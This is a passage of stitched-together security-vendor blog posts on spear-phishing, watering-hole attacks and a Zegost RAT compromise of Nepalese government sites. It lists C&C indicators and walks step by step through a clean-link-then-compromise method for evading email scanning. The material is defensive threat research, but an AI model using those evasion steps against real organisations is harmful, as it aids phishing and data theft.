reputable email address (often spoofed by the attackers) to targeted recipients.\n	Step 4 - A large percentage of recipients act on the email by clicking on an embedded URL that links to a website that surreptitiously downloads malware. The site may be created specifically for this attack, or it could be a legitimate site that has been compromised.\n	Step 5 - The malware looks for network vulnerabilities, perhaps to shut down security defenses and create back-door access to internal systems to capture valuable corporate information.\n	Step 6 - Confidential data such as intellectual property and customer data is stolen.\nAs low-volume, targeted phishing attacks proliferate, organizations need to reexamine their email security posture and employee education strategy. Therefore, I suggest:\n\nEducating your employees and build awareness of spear-phishing campaigns and how they are executed. For example, try pen testing your employees. Give them real-world examples of phishing attacks, allowing for the opportunity to relay immediate, focused feedback and training to those who fall victim to the exercise.\n	Deploying an inbound email sandboxing solution to continually analyze and monitor for malicious content.\n	Using real-time analysis to constantly inspect your web traffic with a web security gateway solution to stop malicious URLs from reaching inboxes\nSpear-phishing is becoming one of the most successful types of attack methods penetrating networks and stealing data today. We can\'t meet this and other cyber security challenges alone. It\'s imperative for the public and private sector to work together to fight cybercrime and restore Canada\'s cyber reputation.

These include:\nDramatic shifts in attack strategy\n  New security evasion tactics\n  An evolution of the targeted threat model\nFrom Spam to Phish\nTo begin talking about phishing, you must first look at email security trends in general, and this usually begins with a discussion on spam.\nSpam, often used as the first stage in many attacks, is sent in huge volumes to ensure penetration before signatures and other updates can be created be vendors or deployed by customers    \n  92 percent of email spam contains a URL.\n  The total percent of spam that can be categorized as leading to a traditional phishing is approximately 1.62 percent.\n  While this may not seem huge, it can be placed into perspective by the fact that spam campaigns can reach more than a quarter of a million emails per hour and that the percentage of virus-related email spam was only 0.4 percent. Phishing attempts outnumber malicious executables in email volume. \nThe majority of these broad phishing attacks share a link to a fake web landing pages to steal the log in credentials of users. Where are these phishing sites hosted? Our research indicates that a large portion of these sites is hosted in the United States. This doesn’t mean that the majority of phishing criminals are in the U.S. It is more likely a representation of available bandwidth, infrastructure, number of servers and ease of domain registration. \nThe U.S. continues to dominate the volume of hosted phishing URLs.\nTop 10 countries hosting phishing URLs: *Based on September 30, 2011-October 1, 2012 research\nUnited States\n  Canada\n  Bahamas\n  Egypt\n  Germany\n  United Kingdom\n  Netherlands\n  France\n  Brazil\n  Russian Federation \nIn this circumstance, the objective is to send a huge volume of emails with a lure compelling to a larger audience. So what does it take to get users to click?\nSecurity as Social Engineering\nIncreasingly, attackers are using an individual’s fears of compromise against them. In this way, they have taken advantage of a tactic employed so successful by fake or rogue AV peddlers. \nSECURITY ALERT!\nHow many times have you been browsing a web page and you get a pop up warning you that your computer is compromised? Most of us now know that these popups are the result of a fake AV scam and many of us have been conditioned not to click on these. However, if you receive a security alert email that looks like it comes from an organization you have a relationship with, such as a bank, or a social network you are a member of, it may increase your likelihood to click. Typically the page components replicate a real site, right down to the security warning to “Stay alert!”\nIncreasingly, phishers are using security notifications and alerts in their lures. In fact, after an analysis looking at the most recent quarter of this year, Websense Security Labs has determined that four of the top five subject lines of phishing attempts by volume are security messages:\nFour out of the top five phishing email subject lines are related to security. These types of attacks represent the largest volume of recent subject lines designed to lure in victims.\nTop five phishing email subject lines: *Based on July – September 2012 research\nYour account has been accessed by a third party\n  (Bank Name) Internet Banking Customer Service Message\n  Security Measures\n  Verify your activity\n  Account security Notification\nBut I work in a business you say… we have an email security system in place that inspects for viruses and does some rudimentary URL scanning…\n\nDodging the Cops: New Phishing Security Evasion Techniques\nA disturbing new twist on targeted attacks has started to emerge this year that directly affects professionally managed networks. If we look at the days of the week when most phishing emails are sent, we notice a huge uptick in volume on Fridays, Sundays and Mondays.\nMost phishing emails are sent on Fridays, followed by Monday and Sunday. The bad guys have learned that they can evade email security measures by sending an email with a clean link on Friday or over the weekend – bypassing email URL scanning. Then, over the weekend they compromise the URL with malicious code.\nTop phishing days of the week (percentage): *Based on July-August 2012 research\nFriday (38.5%)\n  Monday (30%)        \n  Sunday (10.9%)      \n  Thursday (6.5%)     \n  Tuesday (5.8%)       \n  Wednesday (5.2%) \n  Saturday (3.2%)                   \nThe bad guys know potential victim’s behavioral patterns. They know worker’s minds can stray on Fridays in a more relaxed setting. Relaxation and anticipation of the weekend can lead to more web browsing and an increased likelihood to click on links in emails. Similarly, stricken by a case of the Monday Blues, workers are also more likely to wander. By studying these behavioral elements, phishers know that they can increase their success rate. These guys are masters of lures and understanding their subjects. \nBut they don’t just study their subjects, they study the security deployed to protect employees. This is also significantly increasing the volume of email sent late on a Friday and on Sunday.\nThe bad guys have learned that they can evade email security measures by sending an email with a clean link on Friday or over the weekend – bypassing email URL scanning. Then, over the weekend, they compromise the URL with malicious code.\nA typical attack of this type would have the bad guy doing the following:\nFind a URL that can be easily compromised… but do nothing at that time. Leave it ‘as is’ for now.\n  Craft an email that will not trigger spam, AV or other security measures based on its content, but include links to the currently ‘safe’ URL. Since they typically pretend to be something legitimate, it is best to simply copy a legitimate message… and only change one link to the ‘safe’ URL.\n  Send the email over the weekend, or late at night, so email defenses will approve the email and deliver it into the user’s mailbox.\n  Just before you believe employees will begin accessing email, compromise the URL and install that part of the attack strategy.\nEvasion techniques like these help when hackers are going for the big game – spear-phishing employees with access to a specific network or data or whale phishing, the targeting of executives at companies.\n\nSpear-phishing: The CSO Nightmare\nSpear-phishing is one of the most pressing issues IT officers face today, and one they feel the least confident addressing.\nSpear-phishing by definition isn’t a widely cast net. Instead, the attackers use well-crafted lures that incite a group or an individual’s urge to click. They are essentially socially engineering their victims onto the spear. Many of the targets of spear-phishing may also have an awareness of security initiatives in place, and may unwittingly rely more heavily on them.\nFor example:\nThe White House became the victim of a spear-phishing attack just a few days ago. It is alleged that Chinese hackers attempted to gain access to an unclassified network within the office. Although no data was reported lost, the potential for a flood of increased attacks is increased after a successful incident.\n  Last year, an email spear-phishing attack succeeded at Oak Ridge National Laboratory before the organization cut off internet access to workers. The Oak Ridge facility handles classified and non-classified research for the federal government and is known for researching cybersecurity initiatives. A targeted email was sent to specific employees masquerading as an employee benefits email from the human resource department. Data was presumed lost in this incident. This is in addition to a previous incident that exposed several years\' worth of the social security numbers of visitors to the Lab.\n  In March 2011, executives from security company RSA announced a possible breach of SecurID product information from a spear-phishing attack. A spear-phishing e-mail was sent to two small groups within the company. Though the e-mail was automatically marked as Junk, the subject of the message (\"2011 Recruitment Plan\") tricked one employee into opening it anyway. Later, in May 2011, Lockheed Martin announced it had been hacked and RSA SecurID tokens were involved.\n  GhostNet, Night Dragon, and the Operation Aurora attack against Google, Adobe and approximately a dozen other companies, and many of the other so-called advanced persistent threats (APT) that have been publicly documented have been initiated at least in part through targeted spear phishing emails.\nSpear-phishing is one of the primary vectors of compromise and subsequent data loss.\nThe Watering Hole: A New Way to Hunt\nRecently, attackers responsible for past targeted spear-phishing attacks have added a new wrinkle to the old phishing attack. This one involves lying in wait for targets to come to them, rather than supplying an active lure. Websense Security Labs has identified a number of these attacks, two of which took place prior to June 2012, the date previously disseminated by other researchers as the beginning of this type of attack. \nIn May 2012, the Websense ThreatSeeker Network detected that the Institute for National Security Studies (INSS) website in Israel was injected with malicious code. INSS is described in its website as an independent academic institute that studies key issues relating to Israel\'s national security and Middle East affairs.\n\nWhile we can\'t determine that the infection of this website with exploit code is part of a targeted attack, one could deduce that visitors to this type of site are likely to have an interest in national security or are occupied in this field hence making it an attractive place for cybercriminals and nation states to wait for victims of a certain commonality to saunter by and then infect them. This is an effective way for hackers to reach a very targeted group, without sending out socially engineered lures.\nWhile the INSS attack served up Poison Ivy, a common remote access tool used in the RSA attacks, we have also seen other exploits used in similar compromises:\nNepalese government websites were compromised to serve Zegost RAT in August 2012.\n  Also, in May 2012, the Amnesty International UK website was compromised to serve Gh0st RAT.\n  All of these used the same vulnerability (CVE-2012-0507).\nAttacks of this nature may be a way for nation-states to garner additional information from a select audience without having to know the contact information or specific lure likely to compromise a target. This could be considered reconnaissance leading to more specific targeting and a more traditional spear-phish attempt.\nThese attacks illustrate how spam has evolved to phishing, which has evolved to spear-phishing, which in turn has evolved into sophisticated, targeted web compromises (watering holes), something unheard of just a short time ago.\n\nThree Ways to Stop Spear-phishing\nWebsense recommends a three-pronged approach designed to stop 95-99 percent of spear-phishing attempts:\nEmployee education: The human element is incredibly important. Employee education is fundamental to preventing a spear-phish attack. Consider pen-testing your users. Show them why they need to think before they click. Also, use a combination of audio and visual education methods like videos, webinars, newsletters and in-person trainings.\n  Inbound email sandboxing: The most important control for stopping spear-phishing is to deploy a solution that checks the safety of an emailed link when a user clicks on it. You need to have URL sandboxing technology in place that analyzes website content and browser code in real time. \n  Real-time analysis and inspection of your web traffic: Stop malicious URLs from even getting to your users’ inboxes at your gateway. Even if you have inbound email sandboxing, some users might click on a link through a personal email account, like Gmail. In that case, your email spear-phishing protection is unable to see the traffic. Your web security gateway needs to be intelligent, analyze content in real time, and be 95+ percent effective at stopping malware.\n\nClick to download and view a pdf of the full size infographic: 6545.Websense phishing infographic OCT12.pdf\nClick here to download the full size PDF infographic in Italian.', 'https://www.forcepoint.com/insights/what-scaring-businesses-most-spear-phishing-new-websense-security-labs-research\n');

Well, it’s official: Facebook announced it has 1 billion active users. It’s hard to believe that only four short years ago the company reached 100 million active users. This is an incredible milestone for the social media giant. With 1 billion users on Facebook, and hundreds of millions of users on other social networking sites, the social web has taken on a life of its own, connecting people and businesses around the globe.\n\nHowever, this trend should put IT managers, DLP professionals and CSOs on increased alert. The acceleration and proliferation of social media use brings with it an ever increasing risk of malware infections, advanced threats and data theft attempts.\n\nToday’s cyber criminals are increasingly utilizing the social web to gather information, produce targeted lures aimed at social media users and infecting entire social circles. They knock on employees’ cyber-office doors and are often greeted with open arms. These social media lures all have one common goal: steal social media credentials, gain trusted access to sensitive data and ultimately mine it for profit. Throughout the last year, Websense Security Labs has encountered an increasing number of social media lures that make efficient use of the medium. These criminals can gain access to employee’s social media accounts, deploy exploit kits and steal company data.\n\nIt is increasingly important for businesses to keep web threat defenses up-to-date with real-time, in-line technologies, which can foil attempts to access sensitive data in ways traditional, signature-based defenses simply can’t. It also is crucial to ensure employees’ safe social media experience with granular social media access controls, and improve employee awareness of social media threats through ongoing employee training.

But what about smaller campaigns that are no less dangerous? \n\nBroad campaigns often spoof notifications from well-known businesses, establishments, organizations, and agencies, and are very widespread these days. However, smaller volume campaigns sometimes can be as (or even more) dangerous by bypassing the victim\'s defenses.\n\nLast week, the Websense ThreatSeeker® Network intercepted one such campaign. This small-volume, malicious campaign targeted businesses with legitimate-looking email that refer to items like purchase orders, quotes, and supply information. All of these email had attachments that install variants of the popular Zeus malware on the victim\'s computer.\n\nWebsense Cloud Email Security quarantined these emails as containing a potential virus before most of the malicious attachments were detected by antivirus (AV) engines. Websense ACE (Advanced Classification Engine) provides the extra layers of protection that help Cloud Email Security protect customers against a wide array of threats. \n\nIn many cases, AV signatures are behind the latest threats. But although ACE uses AV as one of its analytics, we found this example where AV was not detecting the threat. Other techniques such as using network behavior (volume vs. time) and reputation are very effective against big campaigns, but would not work in this case, since the volume was low. The content of these email messages looks benign most of the time, so traditional anti-spam rules would not work well either. This is where additional protection is needed. ACE can provide that protection and quarantine such suspicious messages by looking more deeply at their content and features, like the types of attachments, message attributes, web links in each message, and telltale patterns in the content body. \n\nThe period of time between ACE detection and AV detection can potentially prevent a security breach at the most crucial time, averting having to \"play catch-up.\" \n\nLet\'s take a closer look at the email that were intercepted.\n\nThe variant that was most common on September 27, 2012, had subject lines such as:\nRE: NEW ORDER\nRE: ATTACHED PO\nNotice the email body looks quite benign:\n\n\n\nThere were other examples.

Location-Based Services (LBS) are a case in point. Mobile apps using geolocation information are increasingly popular, offering people new ways to connect with nearby friends or find people with shared interests. Advertisers can tempt nearby customers with coupons and discounts, targeting people around the corner, and therefore more likely to stop in than those on the other side of world.\n  Many sites use visitors\' IP addresses to do a geolocation lookup in order to serve local content and ads. These can range from perfectly legitimate local headlines to the all-too-familiar \"Local girls in [your city here] want to meet you tonight!\" Using a new, mobile twist on an old threat, LBS can also help phishing and other scammers find likely victims. As we noted in a previous post, scammers--like legitimate businesses--try to optimize their operations to avoid wasting time and resources on unproductive activities. LBS can help them do this in several ways.\n  Websense researchers have found many cases of LBS-based phishing attacks. Here we illustrate an example from MoMo, a Chinese LBS social networking app. To the right is a screenshot showing a message allegedly from a pretty girl just 124.78 km away from you.\n    \n  Along with an attractive picture, she says, “Hello! I just got here and want to meet people around. It’s a pleasure if we can be friends. Here is my blog site [URL deleted]. You can see my pictures and know me more from there first.”\n  The link leads to a phishing page that tries to steal the username and password of your account at QQ.com, a major Chinese portal that ranks 9th overall in the Alexa Internet ranking. The links could just as easily be spam or drive-by-downloads.\n  Why might this approach be more productive from the spammer\'s perspective than traditional email spam? First, a \"local\" contact may seem more trustworthy, encouraging you to lower your guard. Second, the attractive profile pics are very tempting bait. And finally, browsers on mobile devices can\'t show the full URL, so the part that victims see often looks legit. \nThis is just the latest wrinkle in concerns over LBS-based apps. Last year, a British security firm found that mobile check-ins via Facebook, Twitter, and other social media, are extensively used by burglars to target empty homes to rob. The average home robbery takes only ten minutes, which means you can easily be cleaned out while you\'re enjoying coffee at your favorite Starbucks (after announcing to the immediate world that you\'re there).\n  But it\'s not enough to simply keep quiet about where you are because some apps make the announcement for you.  Geotagging on cameras and phones, for example, automatically embeds GPS data into photos.\n  LBS can be a particular concern with children. On the one hand, geolocation can offer parents peace of mind, knowing their youngsters can be found quickly if they wander off. On the other hand, predators can easily target potential victims by inducing naive kids to reveal personal data, or just by using automated geolocation information. Kids and teens often share photos taken with their mobile phones, and anyone with some basic technical skills and an EXIF interpreter can extract embedded data to determine exactly where the photo was taken. Even if the phone\'s GPS is turned off, some apps include GPS-enabling permissions.\nWebsense will continue to monitor developments in this area to protect our customers, their data, and systems from new and evolving security threats.', 'https://www.forcepoint.com/security-labs/hook-line-and-sinker-dangers-location-based-services\n');

We swapped war stories, hashed out the security challenges they face every day and they shared how they’ve been successful. These CSOs work in a variety of industries, including federal, finance and healthcare. Recently, there have been a number of highly public targeted attacks, which led to a lengthy discussion on spear-phishing. I found their insights very valuable and I wanted to share some key points below.\n\nToday’s phishing attacks are lower volume (slow-and-low for evasion), highly targeted and look legitimate. Malware is also increasingly delivered via an embedded URL, which might not be live until days after the email is sent. In addition, many of the CSOs also received variants of spear-phishing via SMS during the meeting.\n\n100 percent of all the CSOs were very concerned about spear-phishing. Everyone felt their CEO would click on an infected spear-phishing link if an email got through. We all agreed there needs to be a published strategy for effectively dealing with spear-phishing blind spots. It came down to a three-pronged approach designed to stop 95-99 percent of spear-phishing attempts:\n\nEmployee education: The human element is incredibly important. Everyone agreed that employee education is fundamental to preventing a spear-phish attack. Consider pen-testing your users. Show them why they need to think before they click. Also, use a combination of audio and visual education methods like videos, webinars, newsletters and in-person trainings.\n	Many of these CSOs had employee education programs in place that addressed the topic at hire and on an on-going basis. The result isn’t really employee education or security awareness, it’s behavior modification.\n	\n	 \n	Inbound email sandboxing: Most of these CSOs were Websense TRITON customers and cited our new email sandboxing feature as a very effective way of stopping targeted spear-phishing. When an email recipient clicks on an embedded URL, Websense analyzes the website content and browser code in real time, in a cloud environment, to ensure safety in any location at any time. This protects against a new phishing tactic we have seen from the bad guys. They send a clean URL in an email to their targets to get through the organization’s email security. After it is received, they will inject malicious code into the site.\n	\n	 \n	Real-time analysis and inspection of your web traffic: Stop malicious URLs from even getting to your users’ inboxes at your gateway. Even if you have inbound email sandboxing, some users might click on a link through a personal email account, like Gmail. In that case, your email spear-phishing protection is unable to see the traffic. Your web security gateway needs to be intelligent, analyze content in real time, and be 95+ percent effective at stopping malware.\nIf you want to know how to quickly test your controls for this approach, let me know and I will be happy to share how to do it. In addition, every CSO in our roundtable said they rely on multiple layers of defense to stop spear-phishing attempts. For example, if an attacker hooked an unassuming employee with a spear-phish, a DLP system with enabled data theft defenses would prevent corporate intellectual property from being stolen. It’s critical that your most sensitive data is retained and contained. \n\nIt’s scary to think that almost every company in the world has a big spear-phishing blind spot, which can quickly ruin your day and possibly destroy your business.

Whether it is breaking into a security company to steal source code, or a giant search firm to steal login credentials, most advanced attacks have followed this pattern. Understanding the attackers methods can help you to understand how to better protect your organization.\n\nThe four reasons these tactics work while most defences fail is that old defences:\n\nAre primarily based on signature and reputation\n	Lack real-time, inline content analysis\n	Are forward facing only, lacking outbound (data stealing) protection\n	Frequently only offer more of the same in deployment options, leaving areas like SSL traffic in blind spots \nAgainst this backdrop of sophisticated threats, our webcast will help you appreciate the structure of advanced attacks and provide insights on how to respond.

Websense ACE now includes 10 new defense innovations; seven are focused on outbound traffic to keep data theft and call-home communications contained, preventing theft or loss. Because so many of them are industry firsts, I wanted to take a moment to explain what many of these do and why we created them.\n\nTruth is, the bad guys are stealing corporate data and avoiding detection using advanced techniques. In just the last year, we\'ve seen key intellectual property and user identities stolen from corporations and government agencies, including some you would least expect-including entertainment (gaming) and security companies!\n\nBelow are a few examples of how cyber criminals are going undetected, stealing your IP and how we can stop it from happening. \n\n\n	Criminal encryption-Once inside your systems, the bad guys have to get communications and data out. They often use proprietary encryption for communications and data files to send it out cloaked, making it unrecognizable to traditional defenses. Websense can now examine the type of encryption for outbound web requests and data files to determine if known encryption methods are being used, or are the communications and data files using proprietary (criminal) encryption techniques that are non-standard. If criminal encrypted uploads are detected, they can be blocked and a high severity alert appears providing incident details including geo-location destination.\n	\n	\"Non Document\" Data Theft-The bad guys know that DLP can stop confidential documents from leaving an organization. However, images are not easily analyzed when in motion. As a result, criminals are accessing proprietary files and using images to steal data because data loss defenses are not analyzing images when in motion through gateways.\n	Websense now includes an in-motion Optical Character Recognition (OCR) defense within the web gateway to catch these attempts at stealing confidential information using images. The OCR feature is also available for end point protection and data discovery within the TRITON solution architecture. So even in a non-document form, Websense recognizes sensitive information and prohibits its misuse as data-at-rest, in-use and in-motion.\n	\n	\"Low and Slow\" Data Theft (Drip DLP)-Organizations often define how many incidents of confidential information can leave an organization per document or request. For example, sending out one customer address to a website is likely to be approved, but sending out more than 100 customer addresses to one website is not. As a result, bad guys have learned these thresholds and are stealing data under the designated allowance in a \"low and slow\" approach. Often it includes sending sensitive information out in pieces over time with patience and persistence.\n	Websense can now recognize slow data \"drip\" leaks for multiple requests over a defined time period to prevent \"low and slow\" data theft. Administrators can define the time periods, incident levels and thresholds within web gateways for stateful (or drip) DLP.\n\n	In addition to Drip DLP, one of the first things cybercriminals do is collect password information to expand their reach within a network. Websense can also detect password file theft, including AD/SAM database data, on outbound web requests. Criminally encrypted upload and password file data theft detection are new features included in the entry level proxy-based Web Security Gateway from Websense.\n	\n	\n	Email Security Evasion-Cybercriminals know that organizations are frequently using email security services that include some sort of embedded link security scanning. They know that if they send an email with an embedded link to a website with malicious code, the email may be blocked from ever getting to the recipient. Here is how they are evading traditional email security measures:\n\n	They take control of a website, but don\'t infect the destination page yet.\n		Next, they send out emails as lures (whether mass or targeted) to potential victims, perhaps on a Friday night. Because this is a clean destination web link, it goes through the email security gateway analysis and the email now resides in the user\'s in-box ready to open.\n		On Sunday night, the bad guys insert malicious code or a redirect to a malware download server into the destination website. Remember, the email with the embedded web link is already in the victim\'s box, ready to open.\n		On Monday, the victim heads out to a favorite coffee shop before work and opens up the email and clicks on the embedded web link - leading to the now malicious website and resulting malware infection.\n	\nOur Websense Security Labs have seen this type of attack increasing on a regular basis. Websense now has the capability to mark these emails with embedded links for real-time cloud sandboxing analysis for point-of-click protection whenever and wherever the email is opened and the web link is clicked upon. For example, when a user goes to click on the email embedded web link on Monday, the original web link has been wrapped by Websense with a web link to cloud-based security services providing real-time security analysis of the original web link destination. This defense is key against spear-phishing and targeted attacks blending email and web together.\n\nWe\'ve also upped the ante with forensic intelligence. We are able to clearly illustrate:\n\nWho is being attacked (e.g. finance, engineering, person, title, etc.).\n	How the attack happened, with the option to use an online malware sandbox service to see step-by-step attack infection methods and dynamic web links and call-home requests.\n	Where the attack communications are destined with geo-location awareness for countries.\n	What data was targeted and when applicable, forensic data capture.\nWebsense researches the latest threats and data theft trends and anticipates tomorrow\'s. These methods of prevention and detection for containment are only available with Websense TRITON security solutions. With this release, the Websense TRITON solution redefines the security gateway and clearly demonstrates that we are leading the security industry in innovation, and more specifically using DLP as a defense against data theft. It provides enterprises with the deep protection, forensics and visibility necessary to prevent today\'s advanced attacks that lead to data theft.\n\nAnd these are just a few of the additions we have implemented.

The aim of this injection is to install, through successfully exploiting that Java weakness, a backdoor that is also dubbed \"Zegost\" on the systems of visitors to these websites.\n\nThis vulnerability (CVE-2012-0507) was also used in the Amnesty International UK website compromise and in the INSS website compromise that we reported a few months back. It\'s interesting to note that all those compromises had injected code that was taken from the Metasploit framework, served in clear form, and not obfuscated. Although the use of code from the Metasploit framework doesn\'t necessarily indicate a link between all the compromises, we found further common characteristics between the compromises of the Amnesty UK website and the Nepalese government website by analyzing the backdoor C&C points when we noticed that they connected to the same domain in China. \n\nThe backdoor variant in this attack is known to have been used in other targeted attacks that were aimed at Uyghurs, Tibetans, and others in that area.\n\nWebsense customers are protected from these threats by ACE, our Advanced Classification Engine.\n\n \nTechnical Analysis\n\nAccording to Cyberwarnews, in early 2012, the websites of Nepalese institutions, such as the police, suffered two other types of attacks mainly in the form of defacements and data leakage. But it\'s not just Nepal that has been affected. This region has recently seen a sequence of targeted attacks and APTs.\nBelow is the content of the Nepalese National Information Technology Center (NITC) Web page along with the injected code marked in red: \n\n\n \nThe main page was injected with a Java JAR file loader which once rendered by the Web browser is executed and attempts to exploit the CVE-2012-0507 vulnerability. The name used for the Java class name (\"msf.x.Exploit.class\") and the content of the file confirmed that the code was taken from the Metasploit framework. If the exploit code in the JAR file has been successfully executed, the exploit shellcode downloads and runs the executable file named \"tools.exe\" on the impacted system (MD5: 3c7b7124f84cc4d29aa067eca6110e2f).\nThe ThreatSeeker Network was able to connect that same executable file dropped from nitc.gov.np (National Information Technology Center) to another Nepalese government website, opmcm.gov.np (Office of the Prime Minister and Council Minister website), as shown below:\n\n\nThe red, boxed URL is the website of the Office of the Prime Minister and Council Minister. We found out that this particular website was compromised this year, at least from May 9-15, to serve this same backdoor executable (MD5: 3c7b7124f84cc4d29aa067eca6110e2f):\n\n\n\nThe content that was injected between these dates at the website of the Office of the Prime Minister and Council Minister was identical to the code injected at the National Information Technology Center website, confirming that the same attack vector was used for both:\n\nWe detected that the dropped backdoor \"tools.exe\" (MD5: 3c7b7124f84cc4d29aa067eca6110e2f) is a variant \"AD\" of the backdoor Zegost. This backdoor toolkit or remote administration tool (RAT) has also been involved in other targeted attacks in Asia, according to an analysis by AlienVault in their research blog. \nThanks to the Websense ThreatScope® sandbox service, the C&C address was detected at \"who.xhhow4.com,\" as shown in the picture below (for the complete sandbox report, click here).  \nThe domain \"hhow4.com\" was also used as a C&C point for the dropped backdoor served at the compromised Amnesty  UK website, where that variant specifically connected to the address at \"shell.xhhow4.com\" (for the complete sandbox report, click here).\n\n \n\nBoth C&Cs are hosted at IP address 184.22.171.216:\n\n The domain \"xhhow4.com\" is hosted in China by a Web hosting company known as Hichina Zhicheng Technology Co., Ltd. The next image shows a Robtex DNS names graph analysis for that domain:\n\n \nOnce the backdoor is installed on the impacted system, it initiates connections from local TCP port 1320. The destination address is to the C&C  at \"who.xhhow4.com\" and uses remote TCP port 53  (usually the port reserved for the DNS Zone transfer). However, it\'s important to note that the traffic wasn\'t DNS traffic but the proprietary protocol used by the backdoor for remote communications. Below is the first connection sequence between the backdoor and the C&C:\n\n \n\nBy decoding the TCP stream, it is possible to recognize that custom encryption was used to exchange information with the C&C. The network traffic starts also with a keyword, \"URATU,\" as shown below: \n\nOnce executed, the binary creates a Mutex named \"microsoft.com\" reported below:\n\n \n\nThe backdoor also uses common features like other common backdoors, such as keylogging, and supports the ability to accept and run commands remotely. As in other cases, we can see that this backdoor isn\'t highly complex at all, but it\'s certainly no less effective than other complex malware once executed on the target systems. Another interesting aspect of this backdoor file is that it\'s signed with what appears to be an invalid\\fake certificate issued to 360.cn (a Chinese ISP) by VeriSign, as shown in the properties box:\n\n\nThe certificate contains the following details:\n\n \nHaving malicious code signed with certificates is a trend that we’ve seen in other targeted attacks that can reduce the effectiveness of human and automatic countermeasures. \n \nIn this blog, we covered the compromise of Nepalese government websites in what appears to be a chain of targeted attacks. We managed to connect those attacks to a previously reported attack that took place in a different country: the compromise of the Amnesty International UK website. This shows that cyber warfare is trending and kicking and that there\'s certainly an effort by international players to stay dominant and persistent in that realm.\n \nSecurity Researchers: Gianluca Giuliani, Elad Sharf.', 'https://www.forcepoint.com/security-labs/nepalese-government-websites-compromised-serve-zegost-rat\n');

We’ll be covering each of these steps:\n\nReconnaissance– Targeted attackers access credentials and research online profiles, email IDs, org. chart information, hobbies and interests from social profiles to gain insight on their victims.\n	Lures– Designed to prey on human curiosity, web lures often link to videos or breaking news, while email lures are more business-focused on transaction and fake delivery notices.\n	Redirects– Users are usually directed to a survey, rogue anti virus offer or a fake web page where an exploit kit is waiting. Traditional redirects are injection attacks, while newer ones focus on social networking wall postings, fake plug-ins, fake certificates and heavily obfuscated java script.\n	Exploit Kits– The exploit kit objective is like that of a sniper: take the shot with a malware dropper file only when an open door for tested vulnerabilities is found.\n	Dropper Files– This stage is what most people consider the focus of their forward-facing defenses: analyze every file that comes into the network for malware. The problem is dropper files use dynamic packers, so known signatures and patterns are not available.\n	Call-Home– This stage involves calling home for malware downloads and tools, and for sending back information, standard procedure for any successful online attack. The problem is that most defenses are only forward-facing and do not analyze the outbound traffic from infected systems.\n	Data Theft– This is what they are after. The ability to contain an attack and stop data theft raises many questions that we will address. Can your defenses detect password files leaving your network or the use of custom encryption on outbound files?\nIn addition, we’ll be covering: why current defenses are failing; today’s new security requirements; and thenewest, bleeding edge advanced threat and data theft defenses to emerge thus far.\n\nWe look forward to having you join the webinar.Bring your questions and be ready to talk threats!', 'https://www.forcepoint.com/insights/webinar-wednesday-7-stages-advanced-threats-data-theft\n');

For example, more exhibitors are simply about education, including your typical certification schools, but general higher learning institutions, like the University of Maryland, are also here.\n\nAs usual, Black Hat USA is full of security vendors and their products, but there seem to be more ‘service’ offerings showcased this year. This may not be surprising to those who have heard analysts increasingly discuss the weaknesses assumed by an organization that is overly dependent on purely in-house resources.\n\nEducation, services and research tools are obviously taking center stage in the battleagainst cybercrime. All this focus on education is precisely why we’ve developed a few new tools and resources to help resource-strapped customers tap into the expertise of the Websense® Security Labs™ researchers.\n\nSometimes you need more than what you have on-hand—especially when you are dealing with highly advanced malware and complex data stealing attacks. That’s when you need an expert security researcher to help. Our Websense Security Labs have morethan one hundred team members worldwide, hip–deep in the latest threats. The new Websense CyberSecurity Intelligence™ (CSI) services, announced today, help extend their expertise and educational benefits right into your organization.\n\nWebsense CSI services offer both online and 1:1 time with our researchers, through tools, training, in-person guidance and malware forensics.\n\nAll Websense CSI customers will have access to ThreatScope™, an online sandbox environment, to safely test potential malware. It uses our Websense Advanced Classification Engine (ACE) analytics to compile an extensive report of observed behavior on an uploaded file. Insights include the infection process; post-infection activities (such as calling home); system-level events and processes; registry changes and filemodifications.\n\nThink about it, Black Hat USA only comes around once a year, but every day needs to be about education in the security field. Websense CSI services can be an extension of your learning process— giving you access to our researchers and the necessary tools to help you become more educated on the threats of today.\n\nIf you could study one aspect of today’s threats, what would you dive into?', 'https://www.forcepoint.com/insights/black-hat-briefings-exhibits-day-one\n');

We\'ve already blogged about a particularly amusing example caught in one of our honeypots, and a variant that adds phishing to the risks. \nHow does an obvious fraud continue to reel people in? And since the scammers want to find a likely mark and make some easy money, shouldn\'t they use a more credible and plausible email as bait? \nRecent research from Microsoft suggests that email messages full of misspellings, grammar mistakes, and outrageous stories may actually work in the scammers\' favor. Although it may appear counter-intuitive, it seems that the more implausible the bait, the better the chances the scammer has of actually collecting some money.Of course, most people will immediately delete an email like the one shown here (which includes an ironic warning against email scams), leaving the less savvy as easy prey for the scammers, which is exactly what they are looking for. In this way, they weed out the skeptical and cautious and reduce the pool of potential victims to those who are more likely to produce revenue. Because the scam and its Nigerian connection are so well known, there are even reports that non-Nigerian scammers may claim to be Nigerian--again, a means of weeding out the suspicious and homing in on the easy to fleece. Like legitimate businesses, scammers are also looking to optimize their operations, and don\'t want to waste time on unproductive activities.\n \nScambaiters are out to make them do just that, and look ridiculous into the bargain. One site dedicated to this \"cybersport\" explains the game: \"You enter into a dialogue with scammers, simply to waste their time and resources. Whilst you are doing this, you will be helping to keep the scammers away from real potential victims and [messing] around with the minds of deserving thieves.\" \n  In addition, the site notes:\n\"For the most part these criminals are not \'poor people trying to scratch a living\', but are indeed very prosperous compared to their law-abiding countrymen, and many operate in highly organised and highly successful criminal gangs.  Millions of dollars are stolen on a DAILY basis, with absolutely no thought given to victims, who are losing vast amounts of money, homes, relatives, jobs and worse.\"\n \nScambaiters pose as potential victims and lead scammers in a merry dance. Some pretend to misunderstand the scammer\'s instructions, leading to repeated communications from increasingly frustrated scammers, while others send receipts for non-existent airline tickets to prove they are on their way to Africa with the money. Their only concern now is recognizing their contact at the airport arrivals hall. \"Could you kindly send a photo of yourself holding a sign with my name [insert name with humorous or indelicate double meaning] to ensure we are able to meet?\" They can and they do.\nIf you\'re thinking that the scammers\' tales of woe sound like Victorian melodrama, you wouldn\'t be far off. Snail mail variants of the scam predate the internet by almost 200 years, dating back to the 18th and 19th centuries. Nostalgic for the good old days?

